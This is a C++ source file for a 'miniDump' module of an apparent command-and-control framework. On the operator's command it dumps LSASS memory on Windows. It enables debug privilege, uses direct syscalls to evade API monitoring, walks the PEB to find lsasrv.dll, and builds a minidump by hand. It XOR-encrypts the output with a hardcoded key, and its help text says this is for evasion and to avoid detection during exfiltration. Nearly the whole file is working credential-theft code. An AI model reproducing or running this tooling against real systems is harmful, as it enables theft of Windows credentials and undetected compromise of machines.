#include "MiniDump.hpp"

#include <cstring>
#include <array>
#include <vector>

#ifdef _WIN32
#include <windows.h>
#include <codecvt>
#include <locale>

#include <WinDef.h>

#include <syscall.hpp>
#endif

#include "Common.hpp"
#include "Tools.hpp"


using namespace std;


constexpr std::string_view moduleName = "miniDump";
constexpr unsigned long long moduleHash = djb2(moduleName);


#ifdef _WIN32

#pragma pack (push, 1)


struct Memory64Info 
{
    void* Address;
    SIZE_T Size;

    // Constructor for convenience
    Memory64Info(void* address, SIZE_T size)
    : Address(address), Size(size) 
    {

    }
};


typedef struct _MiniDumpHeader
{
     ULONG32       Signature;
     SHORT         Version;
     SHORT         ImplementationVersion;
     ULONG32       NumberOfStreams;
     ULONG32       StreamDirectoryRva;
     ULONG32       CheckSum;
     ULONG32       Reserved;
     ULONG32       TimeDateStamp;
     ULONG32       Flags;
} MiniDumpHeader, *PMiniDumpHeader;


typedef struct _MiniDumpDirectory
{
     ULONG32       StreamType;
     ULONG32       DataSize;
     ULONG32       Rva;
} MiniDumpDirectory, *PMiniDumpDirectory;


typedef struct _MiniDumpSystemInfo
{
    SHORT ProcessorArchitecture;
    SHORT ProcessorLevel;
    SHORT ProcessorRevision;
    char    NumberOfProcessors;
    char    ProductType;
    ULONG32 MajorVersion;
    ULONG32 MinorVersion;
    ULONG32 BuildNumber;
    ULONG32 PlatformId;
    
    ULONG32 UnknownField1;
    ULONG32 UnknownField2;
    ULONG32 ProcessorFeatures;
    ULONG32 ProcessorFeatures2;
    ULONG32 UnknownField3;
    SHORT UnknownField14;
    char UnknownField15;

} MiniDumpSystemInfo, *PMiniDumpSystemInfo;


typedef struct _VsFixedFileInfo
{
    ULONG32 dwSignature;
    ULONG32 dwStrucVersion;
    ULONG32 dwFileVersionMS;
    ULONG32 dwFileVersionLS;
    ULONG32 dwProductVersionMS;
    ULONG32 dwProductVersionLS;
    ULONG32 dwFileFlagsMask;
    ULONG32 dwFileFlags;
    ULONG32 dwFileOS;
    ULONG32 dwFileType;
    ULONG32 dwFileSubtype;
    ULONG32 dwFileDateMS;
    ULONG32 dwFileDateLS;
} VsFixedFileInfo, *PVsFixedFileInfo;


typedef struct _MiniDumpLocationDescriptor
{
    ULONG32 DataSize;
    ULONG32 rva;
} MiniDumpLocationDescriptor, *PMiniDumpLocationDescriptor;


typedef struct _MiniDumpModule
{
    ULONG32 NumberOfModules;
    ULONG64 BaseOfImage;
    ULONG32 SizeOfImage;
    ULONG32 CheckSum;
    ULONG32 TimeDateStamp;
    ULONG32 ModuleNameRva;
    VsFixedFileInfo VersionInfo;
    MiniDumpLocationDescriptor CvRecord;
    MiniDumpLocationDescriptor MiscRecord;
    ULONG64 Reserved0;
    // ULONG64 Reserved1;
} MiniDumpModule, *PMiniDumpModule;


typedef struct _ModuleSize
{
    ULONG32 size;
} ModuleSize, *PModuleSize;



typedef struct _MiniDumpMemory64ListStream
{
    uint64_t NumberOfEntries;
    uint64_t MemoryRegionsBaseAddress;
} MiniDumpMemory64ListStream, *PMiniDumpMemory64ListStream;


typedef struct _MiniDumpMemory64Info
{
    uint64_t address;
    uint64_t size;
} MiniDumpMemory64Info, *PMiniDumpMemory64Info;


__declspec(dllexport) MiniDump* MiniDumpConstructor() 
{
    return new MiniDump();
}

#else


__attribute__((visibility("default"))) MiniDump* MiniDumpConstructor() 
{
    return new MiniDump();
}


#endif


MiniDump::MiniDump()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleName), moduleHash)
#else
    : ModuleCmd("", moduleHash)
#endif
{

}


MiniDump::~MiniDump()
{

}


std::string MiniDump::getInfo()
{
    std::string info;
#ifdef BUILD_TEAMSERVER
    info += "MiniDump Module:\n";
    info += "This module allows you to dump the LSASS process memory and output it as a file that is XOR-encrypted for evasion purposes.\n";
    info += "The XORed dump file will be saved in the current directory. You can then decrypt it, once downloaded in the TeamServer, using the 'decrypt' command.\n\n";
    info += "Usage:\n";
    info += "  miniDump dump dmpFile.xored\n";
    info += "      - Dumps LSASS memory to an XOR-encrypted file (e.g., ./dmpFile.xored)\n\n";
    info += "  miniDump decrypt <path_to_xored_dump>\n";
    info += "      - Decrypts the specified XORed dump file for analysis (e.g., miniDump decrypt /tmp/dmpFile.xored)\n\n";
    info += "Note:\n";
    info += "  - The dump file is XOR-encoded to avoid detection during exfiltration.\n";
    info += "  - Use the 'decrypt' command locally after download to convert it back to a usable minidump.\n";
#endif
    return info;
}


#define dumpCmd "0"

std::string xorKey = "nY5LkT7dXmiWeF2QApDLMQmnHaCR4VzsC6zuN3QgZtTqU7qaaf";


int MiniDump::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 

    if(splitedCmd.size() == 3 && splitedCmd[1]=="dump")
    {
        c2Message.set_cmd(dumpCmd);
        c2Message.set_instruction(splitedCmd[0]);
        c2Message.set_outputfile(splitedCmd[2]);
        return 0;
    }
    else if(splitedCmd.size() == 3 && splitedCmd[1]=="decrypt")
    {

        std::string filename = splitedCmd[2];
        std::ifstream dumpfile(filename, std::ios::binary);
        if (dumpfile) 
        {
            dumpfile.seekg(0, std::ios::end);
            std::streamsize size = dumpfile.tellg();
            dumpfile.seekg(0, std::ios::beg);

            std::string buffer(size, '\0');

            if (!dumpfile.read(&buffer[0], size)) 
            {
                c2Message.set_returnvalue("Error: read file");
                return -1;
            }

            XOR(buffer, xorKey);

            std::string outputFilePath = filename+".dmp";
            std::ofstream outputFile(outputFilePath, std::ios::binary);
            if (outputFile) 
            {
                outputFile.write(reinterpret_cast<const char*>(buffer.data()), buffer.size());
                outputFile.close();
            }

            std::string outputMsg = "Output file: ";
            outputMsg+=outputFilePath;
            c2Message.set_returnvalue(outputMsg);
            return -1;
        }
        else
        {
            c2Message.set_returnvalue("Error: file not found");
            return -1;
        }
    }
    else
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }        

#endif
    return 0;
}


#ifdef _WIN32


#include <winternl.h>


typedef struct {
    char base_dll_name[MAX_PATH];
    char full_dll_path[MAX_PATH];
    void* dll_base;
    int size;
} ModuleInformation;


PVOID ReadRemoteIntPtr(HANDLE hProcess, PVOID mem_address)
{
    if (hProcess == NULL || mem_address == NULL) return nullptr;

    BYTE buff[sizeof(void*)];
    SIZE_T bytesRead = 0;
    NTSTATUS ntstatus = Sw3NtReadVirtualMemory_(hProcess, mem_address, buff, sizeof(buff), &bytesRead);
    if (ntstatus != 0 || bytesRead < sizeof(void*)) {
        // read failed
        return nullptr;
    }

    // safe cast to pointer-sized integer then pointer
    if (sizeof(void*) == 8) {
        uint64_t v = 0;
        memcpy(&v, buff, sizeof(v));
        return (PVOID)(uintptr_t)v;
    } else {
        uint32_t v = 0;
        memcpy(&v, buff, sizeof(v));
        return (PVOID)(uintptr_t)v;
    }
}


std::string ReadRemoteWStr(HANDLE hProcess, PVOID mem_address)
{
    if (hProcess == NULL || mem_address == NULL) return std::string();

    const SIZE_T CHUNK_BYTES = 512; // read 512 bytes per chunk (256 wchar_t)
    std::vector<wchar_t> wacc;
    BYTE buffer[CHUNK_BYTES];
    SIZE_T bytesRead = 0;
    PVOID cur_addr = mem_address;
    const size_t MAX_ITER = 32; // cap to avoid infinite loop (32 * 512 = 16 KB)

    for (size_t iter = 0; iter < MAX_ITER; ++iter) 
    {
        NTSTATUS ntstatus = Sw3NtReadVirtualMemory_(hProcess, cur_addr, buffer, CHUNK_BYTES, &bytesRead);
        if (ntstatus != 0 || bytesRead == 0) 
        {
            break;
        }

        // number of wchar_t available in this chunk
        SIZE_T wcharCount = bytesRead / sizeof(wchar_t);
        wchar_t* wptr = reinterpret_cast<wchar_t*>(buffer);

        bool foundNull = false;
        for (SIZE_T i = 0; i < wcharCount; ++i) 
        {
            if (wptr[i] == L'\0') 
            {
                foundNull = true;
                break;
            }
            wacc.push_back(wptr[i]);
        }

        if (foundNull) 
        {
            break;
        }

        // advance to next chunk
        cur_addr = (PVOID)((uintptr_t)cur_addr + bytesRead);
    }

    if (wacc.empty()) 
    {
        return std::string();
    }

    // ensure null-terminated wide string
    wacc.push_back(L'\0');
    std::wstring wstr(wacc.data());

    // Convert to UTF-8
    int required = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
    if (required <= 0) 
    {
        return std::string();
    }
    std::string out(required - 1, '\0'); // exclude terminating null
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &out[0], required, NULL, NULL);

    return out;
}


static bool ci_contains(const std::string &haystack, const std::string &needle)
{
    if (needle.empty()) return true;
    std::string h = haystack;
    std::string n = needle;
    std::transform(h.begin(), h.end(), h.begin(), ::tolower);
    std::transform(n.begin(), n.end(), n.begin(), ::tolower);
    return (h.find(n) != std::string::npos);
}


// typedef for NtQueryInformationProcess
typedef NTSTATUS (NTAPI *PFN_NtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);


std::vector<ModuleInformation> CustomGetModuleHandle(HANDLE hProcess, const std::string &moduleName) 
{
    std::vector<ModuleInformation> modules;

    int process_basic_information_size = 48;
    int peb_offset = 0x8;
    int ldr_offset = 0x18;
    int inInitializationOrderModuleList_offset = 0x30;
    int flink_dllbase_offset = 0x20;
    int flink_buffer_fulldllname_offset = 0x40;
    int flink_buffer_offset = 0x50;

    PROCESS_BASIC_INFORMATION pbi;
    ULONG ReturnLength;
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PFN_NtQueryInformationProcess pNtQuery = (PFN_NtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    NTSTATUS ntstatus = pNtQuery(hProcess, ProcessBasicInformation, &pbi, (ULONG)process_basic_information_size, &ReturnLength);
    if (ntstatus != 0) 
    {
        return modules;
    }

    void* ldr_pointer = (void*)((uintptr_t)pbi.PebBaseAddress + ldr_offset);
    void* ldr_adress = ReadRemoteIntPtr(hProcess, ldr_pointer);

    void* InInitializationOrderModuleList = (void*)((uintptr_t)ldr_adress + inInitializationOrderModuleList_offset);
    void* next_flink = ReadRemoteIntPtr(hProcess, InInitializationOrderModuleList);

    void* dll_base = (void*)1337;
    while (dll_base != NULL) 
    {
        next_flink = (void*)((uintptr_t)next_flink - 0x10);

        // Get DLL base address
        dll_base = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + flink_dllbase_offset));
        void* buffer = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + flink_buffer_offset));
        std::string base_dll_name = ReadRemoteWStr(hProcess, buffer);

        // Full DLL Path
        void* full_dll_name_addr = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + flink_buffer_fulldllname_offset));
        std::string full_dll_name = ReadRemoteWStr(hProcess, full_dll_name_addr);

        if (dll_base != 0 && (moduleName.empty() || ci_contains(base_dll_name, moduleName)))
        {
            ModuleInformation mi;
            memset(&mi, 0, sizeof(mi));
            strncpy_s(mi.base_dll_name, base_dll_name.data(), MAX_PATH - 1);
            strncpy_s(mi.full_dll_path, full_dll_name.data(), MAX_PATH - 1);
            mi.dll_base = dll_base;
            mi.size = 0; 
            modules.push_back(mi);
        }
        
        next_flink = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + 0x10));
    }

    return modules;
}


DWORD GetPidByName(const char * pName) 
{
    PROCESSENTRY32 pEntry;
    HANDLE snapshot;

    pEntry.dwSize = sizeof(PROCESSENTRY32);
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(snapshot, &pEntry) == TRUE) 
    {
        while (Process32Next(snapshot, &pEntry) == TRUE) 
        {
            if (_stricmp(pEntry.szExeFile, pName) == 0) 
            {
                return pEntry.th32ProcessID;
            }
        }
    }
    CloseHandle(snapshot);
    return 0;
}


BOOL setDebugPrivilege()
{
    BOOL bRet = FALSE;
    HANDLE hToken = NULL;
    LUID luid = { 0 };

    // if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
    Sw3NtOpenProcessToken_(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
    if(hToken!=NULL)
    {
        // TODO do manualy
        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
        {
            TOKEN_PRIVILEGES tokenPriv = { 0 };
            tokenPriv.PrivilegeCount = 1;
            tokenPriv.Privileges[0].Luid = luid;
            tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

            // bRet = AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
            Sw3NtAdjustPrivilegesToken_(hToken, FALSE, &tokenPriv, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PULONG)NULL);
            bRet = TRUE;
        }
    }

    return bRet;
}


// Function to serialize a struct to a byte array
template <typename T>
std::vector<uint8_t> StructToByteArray(const T& header) 
{
    std::vector<uint8_t> byteArray(sizeof(T));
    std::memcpy(byteArray.data(), &header, sizeof(T));

    return byteArray;
}


std::vector<uint8_t> StringToUnicodeVector(const std::string& input) 
{
    std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
    std::wstring wideString = converter.from_bytes(input);

    std::vector<uint8_t> unicodeVector;
    const uint8_t* data = reinterpret_cast<const uint8_t*>(wideString.data());
    unicodeVector.insert(unicodeVector.end(), data, data + wideString.size() * sizeof(wchar_t));

    return unicodeVector;
}


bool WriteStringToFile(const std::string& filename, const std::string& data) 
{
    std::ofstream outputFile(filename, std::ios::binary);
    if (!outputFile.is_open()) {
        return false; // File could not be opened
    }

    outputFile.write(data.data(), data.size());

    if (!outputFile) {
        return false; // Write failed
    }

    outputFile.close();
    return true; // Success
}


typedef LONG(WINAPI* RtlGetVersionPtr)(POSVERSIONINFOW);

OSVERSIONINFOW GetOSInfo() 
{
    RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlGetVersion");

    OSVERSIONINFOW osvi = { 0 };
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    if (RtlGetVersion(&osvi) == 0) 
    {
        return osvi;
    }
    else 
    {
        return osvi;
    }
}


// https://github.com/ricardojoserf/NativeDump
void CreateMinidump(HMODULE lsasrvdll_address, int lsasrvdll_size, const std::vector<Memory64Info>& mem64info_List, const std::string& memoryRegions_byte_arr, std::string& dumpfile)
{            
    std::vector<uint8_t> tmp;

    //
    // Header - 32 bytes
    //
    MiniDumpHeader header = { 0 };;
    header.Signature = 0x504d444d;
    header.Version = 0xa793;
    header.NumberOfStreams = 0x3;
    header.StreamDirectoryRva = 0x20;

    std::vector<uint8_t> header_byte_arr = StructToByteArray(header);
    // std::cout << "header_byte_arr " << header_byte_arr.size() << std::endl;
    // std::cout << "header_byte_arr should be 32 bytes" << std::endl;
    
    //
    // Stream Directory - 36 bytes
    //
    MiniDumpDirectory minidumpStreamDirectoryEntry_1 = { 0 };;
    minidumpStreamDirectoryEntry_1.StreamType = 4;
    minidumpStreamDirectoryEntry_1.DataSize = 112;
    minidumpStreamDirectoryEntry_1.Rva = 0x7c;
    MiniDumpDirectory minidumpStreamDirectoryEntry_2 = { 0 };;
    minidumpStreamDirectoryEntry_2.StreamType = 7;
    minidumpStreamDirectoryEntry_2.DataSize = 56;
    minidumpStreamDirectoryEntry_2.Rva = 0x44;
    MiniDumpDirectory minidumpStreamDirectoryEntry_3 = { 0 };;
    minidumpStreamDirectoryEntry_3.StreamType = 9;
    minidumpStreamDirectoryEntry_3.DataSize = (16 + 16 * mem64info_List.size());
    minidumpStreamDirectoryEntry_3.Rva = 0x12A;

    std::vector<uint8_t> streamDirectory_byte_arr = StructToByteArray(minidumpStreamDirectoryEntry_1);
    tmp = StructToByteArray(minidumpStreamDirectoryEntry_2);
    streamDirectory_byte_arr.insert(streamDirectory_byte_arr.end(), tmp.begin(), tmp.end());
    tmp = StructToByteArray(minidumpStreamDirectoryEntry_3);
    streamDirectory_byte_arr.insert(streamDirectory_byte_arr.end(), tmp.begin(), tmp.end());
    // std::cout << "streamDirectory_byte_arr " << streamDirectory_byte_arr.size() << std::endl;
    
    //
    // SystemInfoStream - 56 bytes
    //
    OSVERSIONINFOW osvi = GetOSInfo();
    uint8_t systeminfostream[56] = { 0 };
    int processor_architecture = 9;
    uint32_t majorVersion = osvi.dwMajorVersion;
    uint32_t minorVersion = osvi.dwMinorVersion;
    uint32_t buildNumber =  osvi.dwBuildNumber;
    memcpy(systeminfostream, &processor_architecture, 4);
    memcpy(systeminfostream + 8, &majorVersion, 4);
    memcpy(systeminfostream + 12, &minorVersion, 4);
    memcpy(systeminfostream + 16, &buildNumber, 4);

    std::vector<uint8_t> systemInfoStream_byte_arr = StructToByteArray(systeminfostream);
    // std::cout << "systemInfoStream_byte_arr " << systemInfoStream_byte_arr.size() << std::endl;
    // std::cout << "systemInfoStream_byte_arr should be 56 bytes" << std::endl;
    
    //
    // ModuleList
    //
    MiniDumpModule module = { 0 };
    module.NumberOfModules = 1;
    module.BaseOfImage = reinterpret_cast<ULONG64>(lsasrvdll_address);
    module.SizeOfImage = lsasrvdll_size;
    module.ModuleNameRva = 0xE8;
    // module.Reserved1 = 0;

    // quick fix on the size!!!
    std::vector<uint8_t> moduleListStream_byte_arr = StructToByteArray(module);
    moduleListStream_byte_arr.push_back(0);
    moduleListStream_byte_arr.push_back(0);
    moduleListStream_byte_arr.push_back(0);
    moduleListStream_byte_arr.push_back(0);
    // std::cout << "moduleListStream_byte_arr " << moduleListStream_byte_arr.size() << std::endl;
    // std::cout << "moduleListStream_byte_arr should be 112 bytes" << std::endl;

    std::string moduleName = "C:\\Windows\\System32\\lsasrv.dll";
    ModuleSize moduleSize;
    moduleSize.size = moduleName.size()*2;
    tmp = StructToByteArray(moduleSize);
    moduleListStream_byte_arr.insert(moduleListStream_byte_arr.end(), tmp.begin(), tmp.end());
    tmp = StringToUnicodeVector(moduleName.c_str());
    moduleListStream_byte_arr.insert(moduleListStream_byte_arr.end(), tmp.begin(), tmp.end());
    moduleListStream_byte_arr.push_back(0);
    moduleListStream_byte_arr.push_back(0);
    // std::cout << "moduleListStream_byte_arr " << moduleListStream_byte_arr.size() << std::endl;
    // std::cout << "moduleListStream_byte_arr should be 174 bytes" << std::endl;

    //
    // Memory64List
    //
    int number_of_entries = mem64info_List.size();
    int offset_mem_regions = 0x12A + 16 + (16 * number_of_entries);
    MiniDumpMemory64ListStream memory64ListStream = { 0 };
    memory64ListStream.NumberOfEntries = number_of_entries;
    memory64ListStream.MemoryRegionsBaseAddress = offset_mem_regions;
    std::vector<uint8_t> memory64ListStream_byte_arr = StructToByteArray(memory64ListStream);
    // std::cout << "memory64ListStream_byte_arr " << memory64ListStream_byte_arr.size() << std::endl;
    // std::cout << "memory64ListStream_byte_arr should be 16 bytes" << std::endl;

    // std::cout << "mem64info_List.size() " << mem64info_List.size() << std::endl;+
    for (int i = 0; i < mem64info_List.size(); i++)
    {
        MiniDumpMemory64Info memory64Info;
        memory64Info.address = reinterpret_cast<uint64_t>(mem64info_List[i].Address);
        memory64Info.size = mem64info_List[i].Size;
        tmp = StructToByteArray(memory64Info);
        memory64ListStream_byte_arr.insert(memory64ListStream_byte_arr.end(), tmp.begin(), tmp.end());
    }
    // std::cout << "memory64ListStream_byte_arr " << memory64ListStream_byte_arr.size() << std::endl;

    // Create Minidump file complete byte array
    std::vector<uint8_t> finalBuffer = header_byte_arr;
    finalBuffer.insert(finalBuffer.end(), streamDirectory_byte_arr.begin(), streamDirectory_byte_arr.end());
    finalBuffer.insert(finalBuffer.end(), systemInfoStream_byte_arr.begin(), systemInfoStream_byte_arr.end());
    finalBuffer.insert(finalBuffer.end(), moduleListStream_byte_arr.begin(), moduleListStream_byte_arr.end());
    finalBuffer.insert(finalBuffer.end(), memory64ListStream_byte_arr.begin(), memory64ListStream_byte_arr.end());
    finalBuffer.insert(finalBuffer.end(), memoryRegions_byte_arr.begin(), memoryRegions_byte_arr.end());
    // std::cout << "memoryRegions_byte_arr " << memoryRegions_byte_arr.size() << std::endl;
    // std::cout << "finalBuffer " << finalBuffer.size() << std::endl;

    dumpfile = std::string(finalBuffer.begin(), finalBuffer.end());
}

#endif


#define LSASS_PID_NOT_FOUND 0
#define ERROR_SETDEBUG 1
#define ERROR_OPEN_PROCESS 2
#define ERROR_GET_REMOTE_HANDLE 3
#define ERROR_WRITE_OUTPUT_FILE 4


int MiniDump::process(C2Message &c2Message, C2Message &c2RetMessage)
{

#ifdef _WIN32

    if(c2Message.cmd() == dumpCmd)
    {
        std::string procname = "lsass.exe";
        DWORD dwPid = GetPidByName(procname.c_str());
        // std::cout << "dwPid " << dwPid << std::endl;
        if(dwPid==0)
        {
            c2RetMessage.set_errorCode(LSASS_PID_NOT_FOUND);
            return -1;
        }

        BOOL ret = setDebugPrivilege();
        // std::cout << "ret " << ret << std::endl;
        if(ret==FALSE)
        {
            c2RetMessage.set_errorCode(ERROR_SETDEBUG);
            return -1;
        }

        // Get process handle with NtOpenProcess
        HANDLE lsassHandle=NULL;
        CLIENT_ID client_id = {0};
        client_id.UniqueProcess = (HANDLE)dwPid;
        client_id.UniqueThread = 0;
        OBJECT_ATTRIBUTES objAttr = {0};
        Sw3NtOpenProcess_(&lsassHandle, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &objAttr, &client_id);
        // HANDLE lsassHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwPid);
        // std::cout << "lsassHandle " << lsassHandle << std::endl;
        if(lsassHandle==NULL)
        {
            c2RetMessage.set_errorCode(ERROR_OPEN_PROCESS);
            return -1;
        }

        // Loop the memory regions
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);

        MEMORY_BASIC_INFORMATION mbi;
        char* address = 0;

        // Get lsasrv.dll information
        // Recoded GetRemoteModuleHandle to use the peb - https://github.com/ricardojoserf/NativeDump/blob/c-flavour/NativeDump/NativeDump.cpp
        std::string lsasrvDll = "lsasrv.dll";
        // HMODULE lsasrvdll_address =  GetRemoteModuleHandle(lsassHandle, lsasrvDll.c_str());
        // if(lsassHandle==NULL)
        // {
        //     c2RetMessage.set_errorCode(ERROR_GET_REMOTE_HANDLE);
        //     return -1;
        // }

        std::vector<ModuleInformation> modules = CustomGetModuleHandle(lsassHandle, lsasrvDll);
        if(modules.size()==0)
        {
            c2RetMessage.set_errorCode(ERROR_GET_REMOTE_HANDLE);
            return -1;
        }
        HMODULE lsasrvdll_address = (HMODULE)modules[0].dll_base;

        int lsasrvdll_size = 0;
        bool bool_test = false;

        std::vector<Memory64Info> mem64info_List;
        std::string memory_regions;
        while (address < sysInfo.lpMaximumApplicationAddress) 
        {
            // TODO NtQueryVirtualMemory
            // if (VirtualQueryEx(lsassHandle, address, &mbi, sizeof(mbi)) == sizeof(mbi)) 
            SIZE_T returnLength;
            if (!Sw3NtQueryVirtualMemory_(lsassHandle, address, MemoryBasicInformation, &mbi, sizeof(mbi), &returnLength)) 
            {
                if (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT)
                {
                    mem64info_List.emplace_back(mbi.BaseAddress, mbi.RegionSize);

                    char* buffer = new char[mbi.RegionSize];
                    SIZE_T bytesRead;
                    // TODO NtReadVirtualMemory
                    // ReadProcessMemory(lsassHandle, (PVOID)address, buffer, mbi.RegionSize, &bytesRead);
                    Sw3NtReadVirtualMemory_(lsassHandle, (PVOID)address, buffer, mbi.RegionSize, &bytesRead);
                    memory_regions.append(buffer, mbi.RegionSize);
                    delete buffer;

                    // append_binary_data(filename, buffer);

                    // Calculate size of lsasrv.dll region
                    if (mbi.BaseAddress == lsasrvdll_address)
                    {
                        bool_test = true;
                    }
                    if (bool_test == true)
                    {
                        if ((int)mbi.RegionSize == 0x1000 && mbi.BaseAddress != lsasrvdll_address)
                        {
                            bool_test = false;
                        }
                        else
                        {
                            lsasrvdll_size += (int)mbi.RegionSize;
                        }
                    }
                }
            }
            address += mbi.RegionSize;
        }

        CloseHandle(lsassHandle);

        std::string dumpfile;    
        CreateMinidump(lsasrvdll_address, lsasrvdll_size, mem64info_List, memory_regions, dumpfile);

        XOR(dumpfile, xorKey);

        // Save to file
        std::string dmpFileName = c2Message.outputfile();
        bool writeOk = WriteStringToFile(dmpFileName, dumpfile);
        if(!writeOk)
        {
            c2RetMessage.set_errorCode(ERROR_WRITE_OUTPUT_FILE);
            return -1;
        }

        c2RetMessage.set_returnvalue("Success");
        return 0;
    }
    
#endif

    return 0;
}

int MiniDump::errorCodeToMsg(const C2Message &c2RetMessage, std::string& errorMsg)
{
#ifdef BUILD_TEAMSERVER
    int errorCode = c2RetMessage.errorCode();
    if(errorCode>0)
    {
        if(errorCode==LSASS_PID_NOT_FOUND)
            errorMsg = "lsass.exe PID not found.";
        else if(errorCode==ERROR_SETDEBUG)
            errorMsg = "setDebugPrivilege failed.";
        else if(errorCode==ERROR_OPEN_PROCESS)
            errorMsg = "OpenProcess failed.";
        else if(errorCode==ERROR_GET_REMOTE_HANDLE)
            errorMsg = "GetRemoteModuleHandle failed.";
        else if(errorCode==ERROR_WRITE_OUTPUT_FILE)
            errorMsg = "Write output file failed.";
        else
            errorMsg = "Unknown error";
        
    }
#endif
    return 0;
}